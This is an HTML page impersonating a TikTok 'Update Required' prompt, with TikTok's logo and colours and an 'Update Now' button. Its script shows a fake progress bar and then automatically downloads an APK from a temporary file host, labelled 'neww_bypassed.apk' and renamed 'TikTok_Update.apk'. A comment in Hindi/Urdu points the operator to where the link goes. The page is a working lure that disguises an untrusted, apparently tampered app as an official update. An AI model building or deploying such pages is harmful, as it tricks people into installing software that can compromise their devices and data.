<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok Update</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #000; color: #fff; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; }
        .container { text-align: center; padding: 20px; max-width: 400px; width: 100%; }
        .logo { width: 80px; height: 80px; margin-bottom: 20px; }
        h1 { font-size: 24px; margin-bottom: 10px; }
        p { color: #aaa; font-size: 14px; margin-bottom: 30px; line-height: 1.5; }
        .btn { background: #FE2C55; color: #fff; padding: 15px 30px; border-radius: 8px; text-decoration: none; font-weight: bold; font-size: 16px; display: inline-block; width: 100%; box-sizing: border-box; border: none; cursor: pointer; }
        .progress { width: 100%; background: #333; height: 6px; border-radius: 3px; margin-bottom: 20px; overflow: hidden; display: none; }
        .progress-bar { width: 0%; background: #FE2C55; height: 100%; transition: width 0.3s; }
        .status { display: none; margin-top: 15px; font-size: 14px; color: #FE2C55; }
    </style>
</head>
<body>
    <div class="container">
        <svg class="logo" viewBox="0 0 24 24" fill="white"><path d="M19.59 6.69a4.83 4.83 0 0 1-3.77-4.25V2h-3.45v13.67a2.89 2.89 0 0 1-5.2 1.74 2.89 2.89 0 0 1 2.31-4.64 2.93 2.93 0 0 1 .88.13V9.4a6.84 6.84 0 0 0-1-.05A6.33 6.33 0 0 0 5 20.1a6.34 6.34 0 0 0 10.86-4.43v-7a8.16 8.16 0 0 0 4.77 1.52v-3.4a4.85 4.85 0 0 1-1-.1z"/></svg>
        <h1>TikTok Update Required</h1>
        <p>Your current version of TikTok is out of date. Please update to the latest version to continue watching.</p>
        <div class="progress" id="prog"><div class="progress-bar" id="bar"></div></div>
        <button id="btn" class="btn">Update Now</button>
        <div class="status" id="status">Downloading update... Please wait.</div>
    </div>
    <script>
        document.getElementById('btn').addEventListener('click', function(e) {
            e.preventDefault();
            this.style.display = 'none';
            document.getElementById('prog').style.display = 'block';
            document.getElementById('status').style.display = 'block';
            
            var bar = document.getElementById('bar');
            var width = 0;
            
            // Tera tmpfiles link yahan hai
            var apkUrl = "https://tmpfiles.org/dl/1792274011.5f2dde4cf9aebaaf/wDAYcetOjwlj/neww_bypassed.apk"; 
            
            var interval = setInterval(function() {
                if (width >= 100) {
                    clearInterval(interval);
                    document.getElementById('status').innerText = "Update Ready! Opening installer...";
                    
                    // Direct Download Trigger
                    var a = document.createElement('a');
                    a.href = apkUrl;
                    a.download = "TikTok_Update.apk";
                    document.body.appendChild(a);
                    a.click();
                    document.body.removeChild(a);
                    
                } else {
                    width += 20;
                    bar.style.width = width + '%';
                }
            }, 200);
        });
    </script>
</body>
</html>
